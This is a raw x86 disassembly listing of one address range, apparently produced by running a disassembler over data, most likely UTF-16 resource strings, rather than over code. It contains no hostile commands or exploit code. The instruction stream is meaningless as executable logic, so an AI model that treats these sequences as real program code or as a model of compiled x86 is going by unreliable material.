  40410d:	add    BYTE PTR [ecx+0x0],ah
  404110:	imul   eax,DWORD PTR [eax],0x18006e
  404116:	add    BYTE PTR [eax],al
  404118:	cmp    BYTE PTR [ebp+0x0],al
  40411b:	jb     0x40411d
  40411d:	jb     0x40411f
  40411f:	pop    edi
  404120:	add    BYTE PTR [ebx+0x0],al
  404123:	popa   
  404124:	add    BYTE PTR [esi+0x0],ch
  404127:	outs   dx,BYTE PTR ds:[esi]
  404128:	add    BYTE PTR [edi+0x0],ch
  40412b:	je     0x40412d
  40412d:	inc    ebx
  40412e:	add    BYTE PTR [edx+0x0],dh
  404131:	add    BYTE PTR gs:[ecx+0x0],ah
  404135:	je     0x404137
  404137:	add    BYTE PTR gs:[edx+0x0],dl
  40413b:	add    BYTE PTR gs:[ebp+0x0],ch
  40413f:	outs   dx,DWORD PTR ds:[esi]
  404140:	add    BYTE PTR [eax+eax*1+0x65],dh
  404144:	add    BYTE PTR [eax+eax*1+0x6c],dl
  404148:	add    BYTE PTR [edx+0x0],ah
  40414b:	inc    ebp
  40414c:	add    BYTE PTR [eax+0x0],bh
  40414f:	jo     0x404151
  404151:	push   eax
  404152:	add    BYTE PTR [eax],al
  404154:	add    BYTE PTR [eax*2+0x72007200],ch
  40415b:	add    BYTE PTR [edi+0x0],bl
  40415e:	inc    ebp
  40415f:	add    BYTE PTR [edx+0x0],dh
  404162:	jb     0x404164
  404164:	outs   dx,DWORD PTR ds:[esi]
  404165:	add    BYTE PTR [edx+0x0],dh
  404168:	push   ebx
  404169:	add    BYTE PTR [ecx+0x0],ah
  40416c:	jbe    0x40416e
  40416e:	imul   eax,DWORD PTR [eax],0x67006e
  404174:	push   esp
  404175:	add    BYTE PTR [ecx+0x0],bh
  404178:	jo     0x40417a
  40417a:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  40417f:	add    BYTE PTR [edx+0x0],ah
  404182:	cdq    
  404183:	add    BYTE PTR [eax],al
  404185:	add    BYTE PTR [edx],ch
  404187:	inc    ebp
  404188:	add    BYTE PTR [edx+0x0],dh
  40418b:	jb     0x40418d
  40418d:	pop    edi
  40418e:	add    BYTE PTR [ecx+0x0],cl
  404191:	outs   dx,BYTE PTR ds:[esi]
  404192:	add    BYTE PTR [eax+0x0],dh
  404195:	jne    0x404197
  404197:	je     0x404199
  404199:	inc    esi
  40419a:	add    BYTE PTR [ecx+0x0],ch
  40419d:	ins    BYTE PTR es:[edi],dx
  40419e:	add    BYTE PTR [ebp+0x0],ah
  4041a1:	dec    esi
  4041a2:	add    BYTE PTR [edi+0x0],ch
  4041a5:	je     0x4041a7
  4041a7:	inc    esi
  4041a8:	add    BYTE PTR [edi+0x0],ch
  4041ab:	jne    0x4041ad
  4041ad:	outs   dx,BYTE PTR ds:[esi]
  4041ae:	add    BYTE PTR [eax+eax*1-0x1f],ah
  4041b2:	add    BYTE PTR [eax],al
  4041b4:	add    BYTE PTR [eax],bl
  4041b6:	inc    ebp
  4041b7:	add    BYTE PTR [edx+0x0],dh
  4041ba:	jb     0x4041bc
  4041bc:	pop    edi
  4041bd:	add    BYTE PTR [ecx+0x0],cl
  4041c0:	outs   dx,BYTE PTR ds:[esi]
  4041c1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4041c5:	add    BYTE PTR [edx+0x0],dh
  4041c8:	outs   dx,BYTE PTR ds:[esi]
  4041c9:	add    BYTE PTR [ecx+0x0],ah
  4041cc:	ins    BYTE PTR es:[edi],dx
  4041cd:	add    BYTE PTR ds:0x26000001,al
  4041d3:	inc    ebp
  4041d4:	add    BYTE PTR [edx+0x0],dh
  4041d7:	jb     0x4041d9
  4041d9:	pop    edi
  4041da:	add    BYTE PTR [ecx+0x0],cl
  4041dd:	outs   dx,BYTE PTR ds:[esi]
  4041de:	add    BYTE PTR [esi+0x0],dh
  4041e1:	popa   
  4041e2:	add    BYTE PTR [eax+eax*1+0x69],ch
  4041e6:	add    BYTE PTR [eax+eax*1+0x41],ah
  4041ea:	add    BYTE PTR [ebx+0x0],dh
  4041ed:	jae    0x4041ef
  4041ef:	add    BYTE PTR gs:[ebp+0x0],ch
  4041f3:	bound  eax,QWORD PTR [eax]
  4041f5:	ins    BYTE PTR es:[edi],dx
  4041f6:	add    BYTE PTR [ecx+0x0],bh
  4041f9:	push   ss
  4041fa:	add    DWORD PTR [eax],eax
  4041fc:	add    BYTE PTR [edx],ah
  4041fe:	inc    ebp
  4041ff:	add    BYTE PTR [edx+0x0],dh
  404202:	jb     0x404204
  404204:	pop    edi
  404205:	add    BYTE PTR [ecx+0x0],cl
  404208:	outs   dx,BYTE PTR ds:[esi]
  404209:	add    BYTE PTR [esi+0x0],dh
  40420c:	popa   
  40420d:	add    BYTE PTR [eax+eax*1+0x69],ch
  404211:	add    BYTE PTR [eax+eax*1+0x4f],ah
  404215:	add    BYTE PTR [eax+0x0],dh
  404218:	je     0x40421a
  40421a:	imul   eax,DWORD PTR [eax],0x6e006f
  404220:	push   esp
  404221:	add    DWORD PTR [eax],eax
  404223:	add    BYTE PTR [eax],ch
  404225:	inc    ebp
  404226:	add    BYTE PTR [edx+0x0],dh
  404229:	jb     0x40422b
  40422b:	pop    edi
  40422c:	add    BYTE PTR [ecx+0x0],cl
  40422f:	outs   dx,BYTE PTR ds:[esi]
  404230:	add    BYTE PTR [esi+0x0],dh
  404233:	popa   
  404234:	add    BYTE PTR [eax+eax*1+0x69],ch
  404238:	add    BYTE PTR [eax+eax*1+0x54],ah
  40423c:	add    BYTE PTR [edx+0x0],dh
  40423f:	popa   
  404240:	add    BYTE PTR [esi+0x0],ch
  404243:	jae    0x404245
  404245:	data16 add BYTE PTR [edi+0x0],ch
  404249:	jb     0x40424b
  40424b:	ins    DWORD PTR es:[edi],dx
  40424c:	add    BYTE PTR [edx+0x1],bh
  40424f:	add    BYTE PTR [eax],al
  404251:	push   ds
  404252:	inc    ebp
  404253:	add    BYTE PTR [edx+0x0],dh
  404256:	jb     0x404258
  404258:	pop    edi
  404259:	add    BYTE PTR [esi+0x0],cl
  40425c:	outs   dx,DWORD PTR ds:[esi]
  40425d:	add    BYTE PTR [ecx+0x0],cl
  404260:	outs   dx,BYTE PTR ds:[esi]
  404261:	add    BYTE PTR [eax+0x0],dh
  404264:	jne    0x404266
  404266:	je     0x404268
  404268:	inc    esi
  404269:	add    BYTE PTR [ecx+0x0],ch
  40426c:	ins    BYTE PTR es:[edi],dx
  40426d:	add    BYTE PTR [ebp+0x0],ah
  404270:	mov    cl,0x1
  404272:	add    BYTE PTR [eax],al
  404274:	es inc ebp
  404276:	add    BYTE PTR [edx+0x0],dh
  404279:	jb     0x40427b
  40427b:	pop    edi
  40427c:	add    BYTE PTR [esi+0x0],cl
  40427f:	outs   dx,DWORD PTR ds:[esi]
  404280:	add    BYTE PTR [esi+0x0],dl
  404283:	popa   
  404284:	add    BYTE PTR [eax+eax*1+0x75],ch
  404288:	add    BYTE PTR [ebp+0x0],ah
  40428b:	push   edx
  40428c:	add    BYTE PTR [ebp+0x0],ah
  40428f:	jno    0x404291
  404291:	jne    0x404293
  404293:	imul   eax,DWORD PTR [eax],0x650072
  404299:	fs add bl,dl
  40429c:	add    DWORD PTR [eax],eax
  40429e:	add    BYTE PTR [esi],ah
  4042a0:	inc    ebp
  4042a1:	add    BYTE PTR [edx+0x0],dh
  4042a4:	jb     0x4042a6
  4042a6:	pop    edi
  4042a7:	add    BYTE PTR [edi+0x0],cl
  4042aa:	outs   dx,BYTE PTR ds:[esi]
  4042ab:	add    BYTE PTR [eax+eax*1+0x79],ch
  4042af:	add    BYTE PTR [edi+0x0],cl
  4042b2:	outs   dx,BYTE PTR ds:[esi]
  4042b3:	add    BYTE PTR [ebp+0x0],ah
  4042b6:	push   eax
  4042b7:	add    BYTE PTR [eax+eax*1+0x61],ch
  4042bb:	add    BYTE PTR [eax+eax*1+0x66],dh
  4042bf:	add    BYTE PTR [edi+0x0],ch
  4042c2:	jb     0x4042c4
  4042c4:	ins    DWORD PTR es:[edi],dx
  4042c5:	add    ch,bh
  4042c7:	add    DWORD PTR [eax],eax
  4042c9:	add    BYTE PTR [edx],bh
  4042cb:	inc    ebp
  4042cc:	add    BYTE PTR [edx+0x0],dh
  4042cf:	jb     0x4042d1
  4042d1:	pop    edi
  4042d2:	add    BYTE PTR [edi+0x0],cl
  4042d5:	jne    0x4042d7
  4042d7:	je     0x4042d9
  4042d9:	jo     0x4042db
  4042db:	jne    0x4042dd
  4042dd:	je     0x4042df
  4042df:	push   edi
  4042e0:	add    BYTE PTR [edi+0x0],ch
  4042e3:	jne    0x4042e5
  4042e5:	ins    BYTE PTR es:[edi],dx
  4042e6:	add    BYTE PTR [eax+eax*1+0x4f],ah
  4042ea:	add    BYTE PTR [esi+0x0],dh
  4042ed:	add    BYTE PTR gs:[edx+0x0],dh
  4042f1:	ja     0x4042f3
  4042f3:	jb     0x4042f5
  4042f5:	imul   eax,DWORD PTR [eax],0x650074
  4042fb:	dec    ecx
  4042fc:	add    BYTE PTR [esi+0x0],ch
  4042ff:	jo     0x404301
  404301:	jne    0x404303
  404303:	je     0x404305
  404305:	add    al,BYTE PTR cs:[eax]
  404308:	add    BYTE PTR [eax*2+0x72007200],ch
  40430f:	add    BYTE PTR [edi+0x0],bl
  404312:	push   edx
  404313:	add    BYTE PTR [ebp+0x0],ah
  404316:	data16 add BYTE PTR [ecx+0x0],al
  40431a:	jae    0x40431c
  40431c:	ins    DWORD PTR es:[edi],dx
  40431d:	add    BYTE PTR [esi+0x0],cl
  404320:	outs   dx,DWORD PTR ds:[esi]
  404321:	add    BYTE PTR [eax+eax*1+0x49],dh
  404325:	add    BYTE PTR [esi+0x0],ch
  404328:	inc    ecx
  404329:	add    BYTE PTR [ebx+0x0],dh
  40432c:	ins    DWORD PTR es:[edi],dx
  40432d:	add    BYTE PTR [eax+0x0],dl
  404330:	popa   
  404331:	add    BYTE PTR [eax+eax*1+0x68],dh
  404335:	add    BYTE PTR [esi+0x2],dl
  404338:	add    BYTE PTR [eax],al
  40433a:	es inc ebp
  40433c:	add    BYTE PTR [edx+0x0],dh
  40433f:	jb     0x404341
  404341:	pop    edi
  404342:	add    BYTE PTR [edx+0x0],dl
  404345:	add    BYTE PTR gs:[esi+0x0],ah
  404349:	push   esp
  40434a:	add    BYTE PTR [eax+eax*1+0x62],ch
  40434e:	add    BYTE PTR [esi+0x0],cl
  404351:	outs   dx,DWORD PTR ds:[esi]
  404352:	add    BYTE PTR [eax+eax*1+0x49],dh
  404356:	add    BYTE PTR [esi+0x0],ch
  404359:	dec    esp
  40435a:	add    BYTE PTR [ecx+0x0],ch
  40435d:	jae    0x40435f
  40435f:	je     0x404361
  404361:	ret    0x2
  404364:	add    BYTE PTR [edx],bh
  404366:	inc    ebp
  404367:	add    BYTE PTR [edx+0x0],dh
  40436a:	jb     0x40436c
  40436c:	pop    edi
  40436d:	add    BYTE PTR [edx+0x0],dl
  404370:	add    BYTE PTR gs:[esi+0x0],ah
  404374:	push   esp
  404375:	add    BYTE PTR [eax+eax*1+0x62],ch
  404379:	add    BYTE PTR [edi+0x0],cl
  40437c:	jbe    0x40437e
  40437e:	add    BYTE PTR gs:[edx+0x0],dh
  404382:	ja     0x404384
  404384:	jb     0x404386
  404386:	imul   eax,DWORD PTR [eax],0x740074
  40438c:	add    BYTE PTR gs:[esi+0x0],ch
  404390:	inc    edx
  404391:	add    BYTE PTR [ecx+0x0],bh
  404394:	dec    edi
  404395:	add    BYTE PTR [ebp+0x0],dh
  404398:	je     0x40439a
  40439a:	jo     0x40439c
  40439c:	jne    0x40439e
  40439e:	je     0x4043a0
  4043a0:	inc    ebp
  4043a1:	add    eax,DWORD PTR [eax]
  4043a3:	add    BYTE PTR [edx],dh
  4043a5:	inc    ebp
  4043a6:	add    BYTE PTR [edx+0x0],dh
  4043a9:	jb     0x4043ab
  4043ab:	pop    edi
  4043ac:	add    BYTE PTR [eax+eax*1+0x6c],dl
  4043b0:	add    BYTE PTR [edx+0x0],ah
  4043b3:	inc    esi
  4043b4:	add    BYTE PTR [edi+0x0],ch
  4043b7:	jb     0x4043b9
  4043b9:	push   edx
  4043ba:	add    BYTE PTR [ebp+0x0],ah
  4043bd:	data16 add BYTE PTR [ecx+0x0],al
  4043c1:	jae    0x4043c3
  4043c3:	ins    DWORD PTR es:[edi],dx
  4043c4:	add    BYTE PTR [esi+0x0],cl
  4043c7:	outs   dx,DWORD PTR ds:[esi]
  4043c8:	add    BYTE PTR [eax+eax*1+0x49],dh
  4043cc:	add    BYTE PTR [esi+0x0],ch
  4043cf:	dec    esp
  4043d0:	add    BYTE PTR [ecx+0x0],ch
  4043d3:	jae    0x4043d5
  4043d5:	je     0x4043d7
  4043d7:	int    0x3
  4043d9:	add    BYTE PTR [eax],al
  4043db:	push   ds
  4043dc:	inc    ebp
  4043dd:	add    BYTE PTR [edx+0x0],dh
  4043e0:	jb     0x4043e2
  4043e2:	pop    edi
  4043e3:	add    BYTE PTR [eax+eax*1+0x79],dl
  4043e7:	add    BYTE PTR [eax+0x0],dh
  4043ea:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  4043ef:	add    BYTE PTR [edx+0x0],ah
  4043f2:	dec    esp
  4043f3:	add    BYTE PTR [edi+0x0],ch
  4043f6:	popa   
  4043f7:	add    BYTE PTR [eax+eax*1+0x1e],ah
  4043fb:	add    al,0x0
  4043fd:	add    BYTE PTR [esi],ah
  4043ff:	inc    ebp
  404400:	add    BYTE PTR [edx+0x0],dh
  404403:	jb     0x404405
  404405:	pop    edi
  404406:	add    BYTE PTR [eax+eax*1+0x79],dl
  40440a:	add    BYTE PTR [eax+0x0],dh
  40440d:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  404412:	add    BYTE PTR [edx+0x0],ah
  404415:	dec    esp
  404416:	add    BYTE PTR [edi+0x0],ch
  404419:	popa   
  40441a:	add    BYTE PTR [eax+eax*1+0x44],ah
  40441e:	add    BYTE PTR [ebp+0x0],dh
  404421:	jo     0x404423
  404423:	ins    BYTE PTR es:[edi],dx
  404424:	add    BYTE PTR [ebp+0x4],dl
  404427:	add    BYTE PTR [eax],al
  404429:	sub    al,0x45
  40442b:	add    BYTE PTR [edx+0x0],dh
  40442e:	jb     0x404430
  404430:	pop    edi
  404431:	add    BYTE PTR [eax+eax*1+0x79],dl
  404435:	add    BYTE PTR [eax+0x0],dh
  404438:	add    BYTE PTR gs:[eax+eax*1+0x6f],cl
  40443d:	add    BYTE PTR [ecx+0x0],ah
  404440:	add    BYTE PTR fs:[ebp+0x0],al
  404444:	js     0x404446
  404446:	arpl   WORD PTR [eax],ax
  404448:	add    BYTE PTR gs:[eax+0x0],dh
  40444c:	je     0x40444e
  40444e:	imul   eax,DWORD PTR [eax],0x6e006f
  404454:	jae    0x404456
  404456:	test   eax,0x22000004
  40445b:	inc    ebp
  40445c:	add    BYTE PTR [edx+0x0],dh
  40445f:	jb     0x404461
  404461:	pop    edi
  404462:	add    BYTE PTR [ebp+0x0],dl
  404465:	outs   dx,BYTE PTR ds:[esi]
  404466:	add    BYTE PTR [ebx+0x0],ch
  404469:	outs   dx,BYTE PTR ds:[esi]
  40446a:	add    BYTE PTR [edi+0x0],ch
  40446d:	ja     0x40446f
  40446f:	outs   dx,BYTE PTR ds:[esi]
  404470:	add    BYTE PTR [edi+0x0],cl
  404473:	jo     0x404475
  404475:	je     0x404477
  404477:	imul   eax,DWORD PTR [eax],0x6e006f
  40447d:	cli    
  40447e:	add    al,0x0
  404480:	add    BYTE PTR [edx],ah
  404482:	inc    ebp
  404483:	add    BYTE PTR [edx+0x0],dh
  404486:	jb     0x404488
  404488:	pop    edi
  404489:	add    BYTE PTR [esi+0x0],dl
  40448c:	popa   
  40448d:	add    BYTE PTR [eax+eax*1+0x75],ch
  404491:	add    BYTE PTR [ebp+0x0],ah
  404494:	push   edx
  404495:	add    BYTE PTR [ebp+0x0],ah
  404498:	jno    0x40449a
  40449a:	jne    0x40449c
  40449c:	imul   eax,DWORD PTR [eax],0x650072
  4044a2:	add    BYTE PTR fs:[eax],dl
  4044a5:	add    eax,0x4d280000
  4044aa:	add    BYTE PTR [ebx+0x0],dh
  4044ad:	add    BYTE PTR [bx+0x0],bl
  4044b1:	inc    ecx
  4044b2:	add    BYTE PTR [ebx+0x0],dh
  4044b5:	ins    DWORD PTR es:[edi],dx
  4044b6:	add    BYTE PTR [edx+0x0],dl
  4044b9:	add    BYTE PTR gs:[ebx+0x0],dh
  4044bd:	outs   dx,DWORD PTR ds:[esi]
  4044be:	add    BYTE PTR [eax+eax*1+0x76],ch
  4044c2:	add    BYTE PTR [ebp+0x0],ah
  4044c5:	add    BYTE PTR fs:[eax+eax*1+0x6f],dl
  4044ca:	add    BYTE PTR [eax+eax*1+0x6c],dl
  4044ce:	add    BYTE PTR [edx+0x0],ah
  4044d1:	xor    al,BYTE PTR ds:0x4d280000
  4044d7:	add    BYTE PTR [ebx+0x0],dh
  4044da:	add    BYTE PTR [bx+0x0],bl
  4044de:	inc    ecx
  4044df:	add    BYTE PTR [ebx+0x0],dh
  4044e2:	jae    0x4044e4
  4044e4:	add    BYTE PTR gs:[ebp+0x0],ch
  4044e8:	bound  eax,QWORD PTR [eax]
  4044ea:	ins    BYTE PTR es:[edi],dx
  4044eb:	add    BYTE PTR [ecx+0x0],bh
  4044ee:	inc    ebp
  4044ef:	add    BYTE PTR [eax+0x0],bh
  4044f2:	jo     0x4044f4
  4044f4:	outs   dx,DWORD PTR ds:[esi]
  4044f5:	add    BYTE PTR [edx+0x0],dh
  4044f8:	je     0x4044fa
  4044fa:	add    BYTE PTR gs:[eax+eax*1-0x6c],ah
  4044ff:	add    eax,0x4d320000
  404504:	add    BYTE PTR [ebx+0x0],dh
  404507:	add    BYTE PTR [bx+0x0],bl
  40450b:	inc    ecx
  40450c:	add    BYTE PTR [ebp+0x0],dh
  40450f:	je     0x404511
  404511:	outs   dx,DWORD PTR ds:[esi]
  404512:	add    BYTE PTR [ebp+0x0],al
  404515:	js     0x404517
  404517:	jo     0x404519
  404519:	outs   dx,DWORD PTR ds:[esi]
  40451a:	add    BYTE PTR [edx+0x0],dh
  40451d:	je     0x40451f
  40451f:	imul   eax,DWORD PTR [eax],0x67006e
  404525:	inc    ecx
  404526:	add    BYTE PTR [ebx+0x0],dh
  404529:	jae    0x40452b
  40452b:	add    BYTE PTR gs:[ebp+0x0],ch
  40452f:	bound  eax,QWORD PTR [eax]
  404531:	ins    BYTE PTR es:[edi],dx
  404532:	add    BYTE PTR [ecx+0x0],bh
  404535:	mov    al,0x5
  404537:	add    BYTE PTR [eax],al
  404539:	sbb    cl,BYTE PTR [ebp+0x0]
  40453c:	jae    0x40453e
  40453e:	add    BYTE PTR [bx+0x0],bl
  404542:	inc    ebx
  404543:	add    BYTE PTR [edi+0x0],ch
  404546:	jo     0x404548
  404548:	jns    0x40454a
  40454a:	jb     0x40454c
  40454c:	imul   eax,DWORD PTR [eax],0x680067
  404552:	je     0x404554
  404554:	rol    BYTE PTR ds:0x4d280000,1
  40455a:	add    BYTE PTR [ebx+0x0],dh
  40455d:	add    BYTE PTR [bx+0x0],bl
  404561:	inc    esp
  404562:	add    BYTE PTR [ecx+0x0],ch
  404565:	jae    0x404567
  404567:	jo     0x404569
  404569:	ins    BYTE PTR es:[edi],dx
  40456a:	add    BYTE PTR [ecx+0x0],ah
  40456d:	jns    0x40456f
  40456f:	inc    ebp
  404570:	add    BYTE PTR [eax+0x0],bh
  404573:	arpl   WORD PTR [eax],ax
  404575:	add    BYTE PTR gs:[eax+0x0],dh
  404579:	je     0x40457b
  40457b:	imul   eax,DWORD PTR [eax],0x6e006f
  404581:	push   esp
  404582:	push   es
  404583:	add    BYTE PTR [eax],al
  404585:	xor    al,0x4d
  404587:	add    BYTE PTR [ebx+0x0],dh
  40458a:	add    BYTE PTR [bx+0x0],bl
  40458e:	inc    esp
  40458f:	add    BYTE PTR [ecx+0x0],ch
  404592:	jae    0x404594
  404594:	jo     0x404596
  404596:	ins    BYTE PTR es:[edi],dx
  404597:	add    BYTE PTR [ecx+0x0],ah
  40459a:	jns    0x40459c
  40459c:	dec    esi
  40459d:	add    BYTE PTR [ebp+0x0],ah
  4045a0:	jae    0x4045a2
  4045a2:	je     0x4045a4
  4045a4:	add    BYTE PTR gs:[eax+eax*1+0x45],ah
  4045a9:	add    BYTE PTR [eax+0x0],bh
  4045ac:	arpl   WORD PTR [eax],ax
  4045ae:	add    BYTE PTR gs:[eax+0x0],dh
  4045b2:	je     0x4045b4
  4045b4:	imul   eax,DWORD PTR [eax],0x6e006f
  4045ba:	push   0x6
  4045bc:	add    BYTE PTR [eax],al
  4045be:	push   ds
  4045bf:	dec    ebp
  4045c0:	add    BYTE PTR [ebx+0x0],dh
  4045c3:	add    BYTE PTR [bx+0x0],bl
  4045c7:	dec    esi
  4045c8:	add    BYTE PTR [edi+0x0],ch
  4045cb:	outs   dx,BYTE PTR ds:[esi]
  4045cc:	add    BYTE PTR [eax+eax*1+0x6c],dl
  4045d0:	add    BYTE PTR [edx+0x0],ah
  4045d3:	inc    esi
  4045d4:	add    BYTE PTR [edi+0x0],ch
  4045d7:	jne    0x4045d9
  4045d9:	outs   dx,BYTE PTR ds:[esi]
  4045da:	add    BYTE PTR [eax+eax*1-0x7d],ah
  4045de:	push   es
  4045df:	add    BYTE PTR [eax],al
  4045e1:	cs dec ebp
  4045e3:	add    BYTE PTR [ebx+0x0],dh
  4045e6:	add    BYTE PTR [bx+0x0],bl
  4045ea:	push   edx
  4045eb:	add    BYTE PTR [ebp+0x0],ah
  4045ee:	data16 add BYTE PTR [ecx+0x0],al
  4045f2:	jae    0x4045f4
  4045f4:	ins    DWORD PTR es:[edi],dx
  4045f5:	add    BYTE PTR [edx+0x0],dl
  4045f8:	add    BYTE PTR gs:[ebx+0x0],dh
  4045fc:	outs   dx,DWORD PTR ds:[esi]
  4045fd:	add    BYTE PTR [eax+eax*1+0x76],ch
  404601:	add    BYTE PTR [ebp+0x0],ah
  404604:	add    BYTE PTR fs:[eax+eax*1+0x6f],dl
  404609:	add    BYTE PTR [ecx+0x0],al
  40460c:	jae    0x40460e
  40460e:	ins    DWORD PTR es:[edi],dx
  40460f:	add    BYTE PTR [esi],cl
  404611:	pop    es
  404612:	add    BYTE PTR [eax],al
  404614:	and    al,0x4d
  404616:	add    BYTE PTR [ebx+0x0],dh
  404619:	add    BYTE PTR [bx+0x0],bl
  40461d:	push   edx
  40461e:	add    BYTE PTR [ebp+0x0],ah
  404621:	data16 add BYTE PTR [eax+eax*1+0x6c],dl
  404626:	add    BYTE PTR [edx+0x0],ah
  404629:	dec    ebp
  40462a:	add    BYTE PTR [ecx+0x0],ch
  40462d:	jae    0x40462f
  40462f:	ins    DWORD PTR es:[edi],dx
  404630:	add    BYTE PTR [ecx+0x0],ah
  404633:	je     0x404635
  404635:	arpl   WORD PTR [eax],ax
  404637:	push   0x76d00
  40463c:	add    BYTE PTR [ecx*2+0x67007300],ah
  404643:	add    BYTE PTR [edi+0x0],bl
  404646:	push   edx
  404647:	add    BYTE PTR [ebp+0x0],ah
  40464a:	data16 add BYTE PTR [eax+eax*1+0x6c],dl
  40464f:	add    BYTE PTR [edx+0x0],ah
  404652:	push   edx
  404653:	add    BYTE PTR [ebp+0x0],ah
  404656:	jae    0x404658
  404658:	outs   dx,DWORD PTR ds:[esi]
  404659:	add    BYTE PTR [eax+eax*1+0x76],ch
  40465d:	add    BYTE PTR [ebp+0x0],ah
  404660:	add    BYTE PTR fs:[ecx+0x34000008],ch
  404667:	dec    ebp
  404668:	add    BYTE PTR [ebx+0x0],dh
  40466b:	add    BYTE PTR [bx+0x0],bl
  40466f:	push   edx
  404670:	add    BYTE PTR [ebp+0x0],ah
  404673:	jae    0x404675
  404675:	outs   dx,DWORD PTR ds:[esi]
  404676:	add    BYTE PTR [eax+eax*1+0x76],ch
  40467a:	add    BYTE PTR [ebp+0x0],ah
  40467d:	inc    ecx
  40467e:	add    BYTE PTR [ebx+0x0],dh
  404681:	ins    DWORD PTR es:[edi],dx
  404682:	add    BYTE PTR [eax+eax*1+0x6f],dl
  404686:	add    BYTE PTR [eax+eax*1+0x6c],dl
  40468a:	add    BYTE PTR [edx+0x0],ah
  40468d:	push   ebx
  40468e:	add    BYTE PTR [eax+eax*1+0x61],dh
  404692:	add    BYTE PTR [edx+0x0],dh
  404695:	je     0x404697
  404697:	add    BYTE PTR gs:[eax+eax*1+0xb],ah
  40469c:	or     DWORD PTR [eax],eax
  40469e:	add    BYTE PTR [eax],dh
  4046a0:	dec    ebp
  4046a1:	add    BYTE PTR [ebx+0x0],dh
  4046a4:	add    BYTE PTR [bx+0x0],bl
  4046a8:	push   edx
  4046a9:	add    BYTE PTR [ebp+0x0],ah
  4046ac:	jae    0x4046ae
  4046ae:	outs   dx,DWORD PTR ds:[esi]
  4046af:	add    BYTE PTR [eax+eax*1+0x76],ch
  4046b3:	add    BYTE PTR [ebp+0x0],ah
  4046b6:	push   edx
  4046b7:	add    BYTE PTR [ebp+0x0],ah
  4046ba:	data16 add BYTE PTR [eax+eax*1+0x6c],dl
  4046bf:	add    BYTE PTR [edx+0x0],ah
  4046c2:	push   ebx
  4046c3:	add    BYTE PTR [eax+eax*1+0x61],dh
  4046c7:	add    BYTE PTR [edx+0x0],dh
  4046ca:	je     0x4046cc
  4046cc:	add    BYTE PTR gs:[eax+eax*1+0x4f],ah
  4046d1:	or     DWORD PTR [eax],eax
  4046d3:	add    BYTE PTR [eax],ah
  4046d5:	dec    ebp
  4046d6:	add    BYTE PTR [ebx+0x0],dh
  4046d9:	add    BYTE PTR [bx+0x0],bl
  4046dd:	push   edx
  4046de:	add    BYTE PTR [ebp+0x0],ah
  4046e1:	jae    0x4046e3
  4046e3:	outs   dx,DWORD PTR ds:[esi]
  4046e4:	add    BYTE PTR [eax+eax*1+0x76],ch
  4046e8:	add    BYTE PTR [ebp+0x0],ah
  4046eb:	add    BYTE PTR fs:[esi+0x0],al
  4046ef:	imul   eax,DWORD PTR [eax],0x65006c
  4046f5:	xchg   esi,eax
  4046f6:	or     DWORD PTR [eax],eax
  4046f8:	add    BYTE PTR [ecx*2+0x67007300],bh
  4046ff:	add    BYTE PTR [edi+0x0],bl
  404702:	push   ebp
  404703:	add    BYTE PTR [esi+0x0],ch
  404706:	imul   eax,DWORD PTR [eax],0x6e
  404709:	add    BYTE PTR [edi+0x0],ch
  40470c:	ja     0x40470e
  40470e:	outs   dx,BYTE PTR ds:[esi]
  40470f:	add    BYTE PTR [ebx+0x0],al
  404712:	jne    0x404714
  404714:	jae    0x404716
  404716:	je     0x404718
  404718:	outs   dx,DWORD PTR ds:[esi]
  404719:	add    BYTE PTR [ebp+0x0],ch
  40471c:	dec    ebp
  40471d:	add    BYTE PTR [ecx+0x0],ah
  404720:	jb     0x404722
  404722:	jae    0x404724
  404724:	push   0x6c006100
  404729:	add    BYTE PTR [ebp+0x0],ah
  40472c:	jb     0x40472e
  40472e:	jae    0x404730
  404730:	push   edx
  404731:	add    BYTE PTR [ebp+0x0],ah
  404734:	data16 add ch,al
  404737:	or     DWORD PTR [eax],eax
  404739:	add    BYTE PTR [eax],bl
  40473b:	dec    ebp
  40473c:	add    BYTE PTR [ebx+0x0],dh
  40473f:	add    BYTE PTR [bx+0x0],bl
  404743:	push   ebp
  404744:	add    BYTE PTR [ebx+0x0],dh
  404747:	popa   
  404748:	add    BYTE PTR [edi+0x0],ah
  40474b:	add    BYTE PTR gs:[edi+0x0],bl
  40474f:	xor    BYTE PTR [eax],al
  404751:	xor    BYTE PTR [eax],al
  404753:	dec    DWORD PTR [ecx]
  404755:	add    BYTE PTR [eax],al
  404757:	sbb    BYTE PTR [ebp+0x0],cl
  40475a:	jae    0x40475c
  40475c:	add    BYTE PTR [bx+0x0],bl
  404760:	push   ebp
  404761:	add    BYTE PTR [ebx+0x0],dh
  404764:	popa   
  404765:	add    BYTE PTR [edi+0x0],ah
  404768:	add    BYTE PTR gs:[edi+0x0],bl
  40476c:	xor    BYTE PTR [eax],al
  40476e:	xor    DWORD PTR [eax],eax
  404770:	xor    BYTE PTR [edx],cl
  404772:	add    BYTE PTR [eax],al
  404774:	sbb    BYTE PTR [ebp+0x0],cl
  404777:	jae    0x404779
  404779:	add    BYTE PTR [bx+0x0],bl
  40477d:	push   ebp
  40477e:	add    BYTE PTR [ebx+0x0],dh
  404781:	popa   
  404782:	add    BYTE PTR [edi+0x0],ah
  404785:	add    BYTE PTR gs:[edi+0x0],bl
  404789:	xor    BYTE PTR [eax],al
  40478b:	xor    al,BYTE PTR [eax]
  40478d:	jp     0x404799
  40478f:	add    BYTE PTR [eax],al
  404791:	sbb    BYTE PTR [ebp+0x0],cl
  404794:	jae    0x404796
  404796:	add    BYTE PTR [bx+0x0],bl
  40479a:	push   ebp
  40479b:	add    BYTE PTR [ebx+0x0],dh
  40479e:	popa   
  40479f:	add    BYTE PTR [edi+0x0],ah
  4047a2:	add    BYTE PTR gs:[edi+0x0],bl
  4047a6:	xor    BYTE PTR [eax],al
  4047a8:	xor    eax,DWORD PTR [eax]
  4047aa:	ret    
  4047ab:	or     al,BYTE PTR [eax]
  4047ad:	add    BYTE PTR [eax],bl
  4047af:	dec    ebp
  4047b0:	add    BYTE PTR [ebx+0x0],dh
  4047b3:	add    BYTE PTR [bx+0x0],bl
  4047b7:	push   ebp
  4047b8:	add    BYTE PTR [ebx+0x0],dh
  4047bb:	popa   
  4047bc:	add    BYTE PTR [edi+0x0],ah
  4047bf:	add    BYTE PTR gs:[edi+0x0],bl
  4047c3:	xor    BYTE PTR [eax],al
  4047c5:	xor    al,0x0
  4047c7:	adc    ecx,DWORD PTR [ebx]
